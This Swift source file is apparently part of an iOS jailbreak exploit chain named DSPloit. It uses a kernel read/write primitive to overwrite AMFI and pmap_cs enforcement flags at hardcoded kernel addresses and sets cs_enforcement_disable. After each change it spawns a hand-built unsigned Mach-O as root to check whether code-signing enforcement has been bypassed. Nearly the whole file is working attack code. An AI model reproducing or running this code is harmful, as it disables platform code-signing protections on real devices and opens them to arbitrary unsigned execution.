//
//  exp_safe_flag_scan.swift
//  DSPloit
//
//  EXPERIMENT: Safe systematic scan of AMFI/pmap_cs __DATA flags
//  ═══════════════════════════════════════════════════════════════
//  STATUS: EXPERIMENTAL — SAFE (only writes to writable __DATA)
//  FIX: Added KRW throttling (15ms/op, 50ms/batch) to prevent
//       kernel stack corruption that caused panic on first run.
//  ═══════════════════════════════════════════════════════════════
//
//  APPROACH:
//  The Rust kernelcache analyzer found specific __DATA byte flags
//  that are CHECKED BY CODE near AMFI enforcement paths.
//  This experiment:
//  1. Reads each flag to confirm current value
//  2. Modifies ONE flag at a time (zero if non-zero, set 1 if zero)
//  3. Tests posix_spawn of unsigned binary after each modification
//  4. Restores original value if spawn fails
//  5. Reports which flag(s) enable unsigned execution
//
//  WHY THIS IS SAFE:
//  - Only writes to __DATA segment (writable, not PPL/KTRR)
//  - Modifies one byte at a time
//  - Restores immediately on failure
//  - No function pointer manipulation
//  - No struct corruption risk
//
//  FINDINGS FROM RUST ANALYZER:
//  - 0xfffffff00a3303d8 = 1 (enforcement flag, already zeroed by step 6)
//  - 0xfffffff00a330e04 = 1 (NEW! checked by code near AMFI)
//  - 0xfffffff00a330408 = 3 (checked by code, enforcement level?)
//  - 0xfffffff00a331190 = 2 (checked by code)
//  - pmap_cs flags at 0xa110000 are ALL ZERO — may need SET to 1
//
//  Created by Royan | 2026-05-28
//

import Foundation
import UIKit

final class ExpSafeFlagScan {
    static let shared = ExpSafeFlagScan()
    private var results: [String] = []
    
    private func log(_ msg: String) {
        results.append(msg)
        globallogger.log("(exp_flagscan) \(msg)")
    }
    
    // ═══════════════════════════════════════════════════════════
    // FLAGS FOUND BY RUST ANALYZER (UNSLID ADDRESSES)
    // Category A: Non-zero flags CHECKED BY CODE (highest priority)
    // ═══════════════════════════════════════════════════════════
    
    struct FlagEntry {
        let unslidAddr: UInt64
        let currentVal: UInt8
        let action: FlagAction
        let description: String
    }
    
    enum FlagAction {
        case zeroIt      // flag is non-zero, try zeroing
        case setToOne    // flag is zero, try setting to 1
        case setToZero   // flag is non-zero, try zeroing (same as zeroIt)
    }
    
    // Priority A: Flags confirmed CHECKED BY CODE near AMFI paths
    private let priorityA_flags: [(UInt64, UInt8, String)] = [
        // These are the MOST LIKELY to control unsigned exec
        (0xfffffff00a330e04, 1, "AMFI checked-by-code flag (NEW, val=1)"),
        (0xfffffff00a330408, 3, "AMFI enforcement level (val=3, checked)"),
        (0xfffffff00a3303d8, 1, "AMFI enforcement flag (known, val=1)"),
        (0xfffffff00a331190, 2, "AMFI checked-by-code flag (val=2)"),
    ]
    
    // Priority B: Other non-zero byte flags in AMFI region
    private let priorityB_flags: [(UInt64, UInt8, String)] = [
        (0xfffffff00a3309f0, 1, "AMFI flag (val=1)"),
        (0xfffffff00a3309f8, 1, "AMFI flag (val=1)"),
        (0xfffffff00a330a58, 1, "AMFI flag (val=1)"),
        (0xfffffff00a330a68, 2, "AMFI flag (val=2)"),
        (0xfffffff00a330a70, 2, "AMFI flag (val=2)"),
        (0xfffffff00a330e08, 1, "AMFI flag (val=1)"),
        (0xfffffff00a330e68, 1, "AMFI flag (val=1)"),
        (0xfffffff00a330e78, 2, "AMFI flag (val=2)"),
        (0xfffffff00a330e80, 2, "AMFI flag (val=2)"),
        (0xfffffff00a330ec8, 3, "AMFI flag (val=3)"),
        (0xfffffff00a331118, 1, "AMFI flag (val=1)"),
        (0xfffffff00a331178, 1, "AMFI flag (val=1)"),
        (0xfffffff00a331188, 2, "AMFI flag (val=2)"),
        (0xfffffff00a3318c8, 1, "AMFI flag (val=1)"),
        (0xfffffff00a331928, 1, "AMFI flag (val=1)"),
        (0xfffffff00a331940, 2, "AMFI flag (val=2)"),
        (0xfffffff00a331988, 1, "AMFI flag (val=1)"),
        (0xfffffff00a3319e8, 1, "AMFI flag (val=1)"),
        (0xfffffff00a3319f8, 2, "AMFI flag (val=2)"),
        (0xfffffff00a331a00, 2, "AMFI flag (val=2)"),
    ]

    // Priority C: pmap_cs flags (all zero — try SETTING to 1)
    // Theory: these might be "allow_invalid" flags that need to be ENABLED
    private let priorityC_flags: [(UInt64, UInt8, String)] = [
        (0xfffffff00a110000, 0, "pmap_cs flag0 (zero, try set 1)"),
        (0xfffffff00a110001, 0, "pmap_cs flag1 (zero, try set 1)"),
        (0xfffffff00a110004, 0, "pmap_cs flag2 (zero, try set 1)"),
        (0xfffffff00a110008, 0, "pmap_cs flag3 (zero, try set 1)"),
        (0xfffffff00a110010, 0, "pmap_cs flag4 (zero, try set 1)"),
        (0xfffffff00a110020, 0, "pmap_cs flag5 (zero, try set 1)"),
        (0xfffffff00a110040, 0, "pmap_cs flag6 (zero, try set 1)"),
        (0xfffffff00a110060, 0, "pmap_cs flag7 (zero, try set 1)"),
        (0xfffffff00a110090, 0, "pmap_cs flag8 (zero, try set 1)"),
    ]
    
    // ═══════════════════════════════════════════════════════════
    // MAIN ENTRY POINT
    // ═══════════════════════════════════════════════════════════
    
    func runAll() -> [String] {
        results.removeAll()
        krwOpCount = 0
        
        log("═══════════════════════════════════════════════════")
        log("  SAFE FLAG SCAN EXPERIMENT")
        log("  iOS \(UIDevice.current.systemVersion)")
        log("  Strategy: modify ONE flag → test spawn → restore")
        log("  ⚡ KRW throttled: 15ms/op, 50ms/batch (no panic)")
        log("═══════════════════════════════════════════════════")
        log("")
        
        guard dspmgr.shared.dsready else {
            log("❌ KRW not active — run jailbreak first")
            return results
        }
        
        let slide = ds_get_kernel_slide()
        log("🔍 kernel_slide = 0x\(String(slide, radix: 16))")
        log("")
        
        // Phase 1: Read all flags and verify they match expected values
        log("── Phase 1: Verify flag values ──")
        log("")
        
        var verifiedA = verifyFlags(priorityA_flags, slide: slide, label: "Priority A")
        let verifiedB = verifyFlags(priorityB_flags, slide: slide, label: "Priority B")
        let verifiedC = verifyFlags(priorityC_flags, slide: slide, label: "Priority C")
        log("")
        
        // Phase 2: Zero ALL Priority A flags simultaneously (most likely to work)
        log("── Phase 2: Zero ALL Priority A flags at once ──")
        log("  (These are confirmed checked-by-code near AMFI)")
        log("")
        
        let comboResult = testFlagCombo(slide: slide)
        if comboResult {
            log("✅✅✅ COMBO WORKED! Priority A flags control unsigned exec!")
            return results
        }
        
        // Phase 3: Test individual flags from Priority A
        log("")
        log("── Phase 3: Test Priority A flags individually ──")
        log("")
        
        for (addr, expectedVal, desc) in priorityA_flags {
            let worked = testSingleFlag(
                unslidAddr: addr,
                expectedVal: expectedVal,
                slide: slide,
                description: desc,
                action: .zeroIt
            )
            if worked {
                log("✅✅✅ FOUND IT! Flag 0x\(String(addr, radix: 16)) controls unsigned exec!")
                log("  → Integrate into main jailbreak chain step 6")
                return results
            }
        }

        // Phase 4: Test pmap_cs flags (set to 1)
        log("")
        log("── Phase 4: Set pmap_cs flags to 1 (allow_invalid?) ──")
        log("")
        
        for (addr, _, desc) in priorityC_flags {
            let worked = testSingleFlag(
                unslidAddr: addr,
                expectedVal: 0,
                slide: slide,
                description: desc,
                action: .setToOne
            )
            if worked {
                log("✅✅✅ FOUND IT! pmap_cs flag 0x\(String(addr, radix: 16)) = allow_invalid!")
                log("  → Setting this to 1 enables unsigned exec!")
                return results
            }
        }
        
        // Phase 5: Test Priority B flags
        log("")
        log("── Phase 5: Test Priority B flags (bulk zero) ──")
        log("")
        
        let bulkResult = testBulkZero(priorityB_flags, slide: slide)
        if bulkResult {
            log("✅✅✅ BULK ZERO of Priority B flags enables unsigned exec!")
            log("  → Need to narrow down which specific flags")
            // Binary search to find minimum set
            binarySearchFlags(priorityB_flags, slide: slide)
            return results
        }
        
        // Phase 6: Combined approach — zero ALL + set pmap_cs
        log("")
        log("── Phase 6: COMBINED — zero all AMFI + set all pmap_cs ──")
        log("")
        
        let combinedResult = testCombinedApproach(slide: slide)
        if combinedResult {
            log("✅✅✅ COMBINED APPROACH WORKS!")
            return results
        }
        
        log("")
        log("❌ All flag modifications failed to enable unsigned exec")
        log("  Conclusion: __DATA flags alone are NOT sufficient")
        log("  The enforcement is in PPL-protected proc_ro or trust cache")
        log("  → Need amfid patch approach (exp_amfid_patch.swift)")
        log("")
        log("═══════════════════════════════════════════════════")
        
        return results
    }

    // ═══════════════════════════════════════════════════════════
    // THROTTLE: Prevent kernel stack corruption
    // ═══════════════════════════════════════════════════════════
    // The darksword KRW path uses kernel stack space for each
    // kread/kwrite. Rapid consecutive calls overflow the stack
    // canary → kernel panic. We MUST throttle between operations.
    
    /// Minimum delay between KRW operations (microseconds)
    private let krwThrottleUs: useconds_t = 15_000  // 15ms
    
    /// Counter to batch throttle (every N ops, do a longer pause)
    private var krwOpCount: Int = 0
    private let krwBatchSize: Int = 4  // pause after every 4 ops
    private let krwBatchPauseUs: useconds_t = 50_000  // 50ms batch pause
    
    /// Throttled kread8 — safe wrapper
    private func safe_kread8(_ addr: UInt64) -> UInt8 {
        krwOpCount += 1
        if krwOpCount % krwBatchSize == 0 {
            usleep(krwBatchPauseUs)
        } else {
            usleep(krwThrottleUs)
        }
        return ds_kread8(addr)
    }
    
    /// Throttled kwrite8 — safe wrapper
    private func safe_kwrite8(_ addr: UInt64, _ val: UInt8) {
        krwOpCount += 1
        if krwOpCount % krwBatchSize == 0 {
            usleep(krwBatchPauseUs)
        } else {
            usleep(krwThrottleUs)
        }
        ds_kwrite8(addr, val)
    }
    
    /// Throttled kread64 — safe wrapper
    private func safe_kread64(_ addr: UInt64) -> UInt64 {
        krwOpCount += 1
        if krwOpCount % krwBatchSize == 0 {
            usleep(krwBatchPauseUs)
        } else {
            usleep(krwThrottleUs)
        }
        return ds_kread64(addr)
    }
    
    /// Throttled kwrite64 — safe wrapper
    private func safe_kwrite64(_ addr: UInt64, _ val: UInt64) {
        krwOpCount += 1
        if krwOpCount % krwBatchSize == 0 {
            usleep(krwBatchPauseUs)
        } else {
            usleep(krwThrottleUs)
        }
        ds_kwrite64(addr, val)
    }
    
    // ═══════════════════════════════════════════════════════════
    // HELPER: Verify flags match expected values
    // ═══════════════════════════════════════════════════════════
    
    private func verifyFlags(_ flags: [(UInt64, UInt8, String)], slide: UInt64, label: String) -> Bool {
        var allMatch = true
        log("  \(label) (\(flags.count) flags):")
        
        for (unslidAddr, expectedVal, desc) in flags {
            let addr = unslidAddr &+ slide
            let actual = safe_kread8(addr)
            let match = (actual == expectedVal)
            if !match { allMatch = false }
            let icon = match ? "✅" : "⚠️"
            log("    \(icon) 0x\(String(unslidAddr, radix: 16)) = \(actual) (expected \(expectedVal)) — \(desc)")
        }
        
        return allMatch
    }
    
    // ═══════════════════════════════════════════════════════════
    // HELPER: Test single flag modification
    // ═══════════════════════════════════════════════════════════
    
    private func testSingleFlag(unslidAddr: UInt64, expectedVal: UInt8, slide: UInt64, description: String, action: FlagAction) -> Bool {
        let addr = unslidAddr &+ slide
        let original = safe_kread8(addr)
        
        // Determine new value
        let newVal: UInt8
        switch action {
        case .zeroIt, .setToZero:
            newVal = 0
        case .setToOne:
            newVal = 1
        }
        
        // Skip if already at target value
        if original == newVal {
            log("  ⏭️ 0x\(String(unslidAddr, radix: 16)) already \(newVal) — skip")
            return false
        }
        
        // Write new value
        safe_kwrite8(addr, newVal)
        usleep(krwThrottleUs) // extra pause after write before verify
        let verify = safe_kread8(addr)
        
        if verify != newVal {
            log("  ❌ 0x\(String(unslidAddr, radix: 16)) write FAILED (PPL?)")
            return false
        }
        
        log("  🔧 0x\(String(unslidAddr, radix: 16)): \(original) → \(newVal)")
        
        // Longer pause before spawn test (let kernel settle)
        usleep(100_000) // 100ms
        
        // Test spawn
        let spawnOk = testUnsignedSpawn()
        
        if spawnOk {
            log("  ✅✅✅ SPAWN SUCCESS after modifying \(description)!")
            return true
        } else {
            // Restore original
            safe_kwrite8(addr, original)
            usleep(krwThrottleUs)
            let restored = safe_kread8(addr)
            log("  ❌ spawn failed — restored to \(restored)")
            return false
        }
    }

    // ═══════════════════════════════════════════════════════════
    // HELPER: Test Priority A combo (all at once)
    // ═══════════════════════════════════════════════════════════
    
    private func testFlagCombo(slide: UInt64) -> Bool {
        var originals: [(UInt64, UInt8)] = []
        
        // Zero all Priority A flags (with throttling)
        for (unslidAddr, _, desc) in priorityA_flags {
            let addr = unslidAddr &+ slide
            let orig = safe_kread8(addr)
            originals.append((addr, orig))
            
            if orig != 0 {
                safe_kwrite8(addr, 0)
                let v = safe_kread8(addr)
                log("  \(v == 0 ? "✅" : "❌") 0x\(String(unslidAddr, radix: 16)): \(orig) → \(v)")
            }
        }
        
        // Also ensure cs_enforcement_disable = 1
        let csEnfAddr = ds_kcache_symbol_runtime("_cs_enforcement_disable")
        if csEnfAddr != 0 {
            safe_kwrite64(csEnfAddr, 1)
            log("  cs_enforcement_disable = 1")
        }
        
        // Pause before spawn test
        usleep(100_000) // 100ms settle time
        
        // Test spawn
        let ok = testUnsignedSpawn()
        
        if !ok {
            // Restore all
            for (addr, orig) in originals {
                if orig != 0 {
                    safe_kwrite8(addr, orig)
                }
            }
            log("  ❌ combo failed — all restored")
        }
        
        return ok
    }
    
    // ═══════════════════════════════════════════════════════════
    // HELPER: Bulk zero test
    // ═══════════════════════════════════════════════════════════
    
    private func testBulkZero(_ flags: [(UInt64, UInt8, String)], slide: UInt64) -> Bool {
        var originals: [(UInt64, UInt8)] = []
        
        for (unslidAddr, _, _) in flags {
            let addr = unslidAddr &+ slide
            let orig = safe_kread8(addr)
            originals.append((addr, orig))
            if orig != 0 {
                safe_kwrite8(addr, 0)
            }
        }
        
        log("  Zeroed \(flags.count) flags (throttled)")
        usleep(100_000) // 100ms settle
        let ok = testUnsignedSpawn()
        
        if !ok {
            for (addr, orig) in originals {
                if orig != 0 { safe_kwrite8(addr, orig) }
            }
            log("  ❌ bulk zero failed — restored")
        }
        
        return ok
    }

    // ═══════════════════════════════════════════════════════════
    // HELPER: Binary search to find minimum flag set
    // ═══════════════════════════════════════════════════════════
    
    private func binarySearchFlags(_ flags: [(UInt64, UInt8, String)], slide: UInt64) {
        log("  Binary searching for minimum flag set...")
        
        let half = flags.count / 2
        let firstHalf = Array(flags[..<half])
        let secondHalf = Array(flags[half...])
        
        let firstOk = testBulkZero(firstHalf, slide: slide)
        if firstOk {
            log("  → First half sufficient")
            return
        }
        
        let secondOk = testBulkZero(secondHalf, slide: slide)
        if secondOk {
            log("  → Second half sufficient")
            return
        }
        
        log("  → Need both halves (or interaction with Priority A)")
    }
    
    // ═══════════════════════════════════════════════════════════
    // HELPER: Combined approach (all AMFI + pmap_cs)
    // ═══════════════════════════════════════════════════════════
    
    private func testCombinedApproach(slide: UInt64) -> Bool {
        var originals: [(UInt64, UInt8)] = []
        
        log("  ⏳ This phase has many KRW ops — throttling heavily...")
        
        // Zero all AMFI flags (A + B) — throttled
        let allAmfi = priorityA_flags + priorityB_flags
        for (i, (unslidAddr, _, _)) in allAmfi.enumerated() {
            let addr = unslidAddr &+ slide
            let orig = safe_kread8(addr)
            originals.append((addr, orig))
            if orig != 0 { safe_kwrite8(addr, 0) }
            
            // Extra pause every 8 flags in this large batch
            if (i + 1) % 8 == 0 {
                usleep(100_000) // 100ms every 8 flags
            }
        }
        
        // Set all pmap_cs flags to 1
        for (unslidAddr, _, _) in priorityC_flags {
            let addr = unslidAddr &+ slide
            let orig = safe_kread8(addr)
            originals.append((addr, orig))
            if orig != 1 { safe_kwrite8(addr, 1) }
        }
        
        // cs_enforcement_disable
        let csEnfAddr = ds_kcache_symbol_runtime("_cs_enforcement_disable")
        if csEnfAddr != 0 { safe_kwrite64(csEnfAddr, 1) }
        
        log("  Zeroed \(allAmfi.count) AMFI flags + set \(priorityC_flags.count) pmap_cs flags to 1")
        usleep(200_000) // 200ms settle before spawn
        
        let ok = testUnsignedSpawn()
        
        if !ok {
            // Restore in batches with pauses
            for (i, (addr, orig)) in originals.enumerated() {
                safe_kwrite8(addr, orig)
                if (i + 1) % 8 == 0 { usleep(100_000) }
            }
            log("  ❌ combined failed — restored")
        }
        
        return ok
    }

    // ═══════════════════════════════════════════════════════════
    // CORE: Test unsigned binary spawn (synchronous)
    // ═══════════════════════════════════════════════════════════
    
    private func testUnsignedSpawn() -> Bool {
        #if !DISABLE_REMOTECALL
        guard dspmgr.shared.rcready else {
            log("    ⚠️ RemoteCall not active")
            return false
        }
        
        let binary = buildMinimalExitBinary()
        let testPath = "/var/jb/tmp/flagscan_test"
        
        var spawnResult: Bool = false
        var spawnMsg: String = ""
        let semaphore = DispatchSemaphore(value: 0)
        
        RootExecutor.shared.executeAsRoot(operation: "flagscan_spawn") { rc in
            let mem = rc.trojanMem
            
            // Ensure directory exists
            let dir = remote_alloc_str(rc, "/var/jb/tmp")
            RootExecutor.rcall(rc, "mkdir", dir, 0o755)
            RootExecutor.rcall(rc, "free", dir)
            
            // Write binary
            let pathAddr = remote_alloc_str(rc, testPath)
            let fd = RootExecutor.rcall(rc, "open", pathAddr,
                UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
            guard fd != UInt64(bitPattern: -1) else {
                RootExecutor.rcall(rc, "free", pathAddr)
                return (false, "open failed", 0)
            }
            
            let writeAddr = mem + 0xC00
            binary.withUnsafeBytes { buf in
                rc.remote_write(writeAddr, from: buf.baseAddress!,
                    size: UInt64(binary.count))
            }
            RootExecutor.rcall(rc, "write", fd, writeAddr, UInt64(binary.count))
            RootExecutor.rcall(rc, "close", fd)
            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
            
            // Spawn
            let pidAddr = mem + 0xA00
            rc[pidAddr].setValue32(0)
            let argvBase = mem + 0xA10
            rc[argvBase].setValue64(pathAddr)
            rc[argvBase + 8].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn",
                pidAddr, pathAddr, 0, 0, argvBase, 0)
            let pid = rc[pidAddr].value32()
            
            // Cleanup
            RootExecutor.rcall(rc, "unlink", pathAddr)
            RootExecutor.rcall(rc, "free", pathAddr)
            
            let ok = (ret == 0 && pid != 0)
            return (ok, "ret=\(ret) pid=\(pid) errno=\(ret)", UInt64(pid))
        }
        
        // Wait for result (max 15s)
        DispatchQueue.global().asyncAfter(deadline: .now() + 15) {
            if let result = RootExecutor.shared.lastResult,
               result.operation == "flagscan_spawn" {
                spawnResult = result.success
                spawnMsg = result.message
            }
            semaphore.signal()
        }
        
        _ = semaphore.wait(timeout: .now() + 20)
        
        if spawnResult {
            log("    ✅ SPAWN SUCCESS: \(spawnMsg)")
        } else {
            log("    ❌ spawn: \(spawnMsg)")
        }
        
        return spawnResult
        #else
        log("    ❌ DISABLE_REMOTECALL")
        return false
        #endif
    }

    // ═══════════════════════════════════════════════════════════
    // HELPER: Build minimal unsigned Mach-O (exit(0))
    // ═══════════════════════════════════════════════════════════
    
    private func buildMinimalExitBinary() -> Data {
        // Minimal arm64 Mach-O that calls exit(0)
        // No code signature, no entitlements — pure unsigned
        var bin = Data()
        
        // Mach-O header (MH_EXECUTE, arm64)
        let header: [UInt8] = [
            0xCF, 0xFA, 0xED, 0xFE, // magic (MH_MAGIC_64)
            0x0C, 0x00, 0x00, 0x01, // cputype (ARM64)
            0x00, 0x00, 0x00, 0x00, // cpusubtype
            0x02, 0x00, 0x00, 0x00, // filetype (MH_EXECUTE)
            0x02, 0x00, 0x00, 0x00, // ncmds (2: segment + unixthread)
            0x60, 0x01, 0x00, 0x00, // sizeofcmds
            0x00, 0x00, 0x00, 0x00, // flags (none — no PIE, no code sig)
            0x00, 0x00, 0x00, 0x00, // reserved
        ]
        bin.append(contentsOf: header)
        
        // LC_SEGMENT_64 (__TEXT)
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0] = 0x19; seg[4] = 0x48 // cmd=LC_SEGMENT_64, cmdsize=72
        // segname = "__TEXT"
        seg[8] = 0x5F; seg[9] = 0x5F; seg[10] = 0x54; seg[11] = 0x45
        seg[12] = 0x58; seg[13] = 0x54
        // vmaddr = 0x100000000
        seg[28] = 0x01
        // vmsize = 0x4000
        seg[32] = 0x00; seg[33] = 0x40
        // fileoff = 0
        // filesize = 0x4000
        seg[40] = 0x00; seg[41] = 0x40
        // maxprot = 5 (r-x)
        seg[48] = 0x05
        // initprot = 5 (r-x)
        seg[52] = 0x05
        bin.append(contentsOf: seg)
        
        // LC_UNIXTHREAD (arm64 thread state)
        var thread = [UInt8](repeating: 0, count: 280)
        thread[0] = 0x05 // cmd = LC_UNIXTHREAD
        thread[4] = 0x18; thread[5] = 0x01 // cmdsize = 280
        thread[8] = 0x06 // flavor = ARM_THREAD_STATE64
        thread[12] = 0x44 // count = 68 (uint32s)
        // PC at offset 256 (x[32] = pc) = 0x100000180
        thread[272] = 0x80; thread[273] = 0x01
        thread[274] = 0x00; thread[275] = 0x00
        thread[276] = 0x01; thread[277] = 0x00
        bin.append(contentsOf: thread)
        
        // Pad to 0x180 (code start)
        while bin.count < 0x180 { bin.append(0) }
        
        // Code: mov x0, #0; mov x16, #1; svc #0x80 (exit(0))
        let code: [UInt8] = [
            0x00, 0x00, 0x80, 0xD2, // mov x0, #0
            0x30, 0x00, 0x80, 0xD2, // mov x16, #1 (SYS_exit)
            0x01, 0x10, 0x00, 0xD4, // svc #0x80
        ]
        bin.append(contentsOf: code)
        
        // Pad to page size
        while bin.count < 0x4000 { bin.append(0) }
        return bin
    }
}
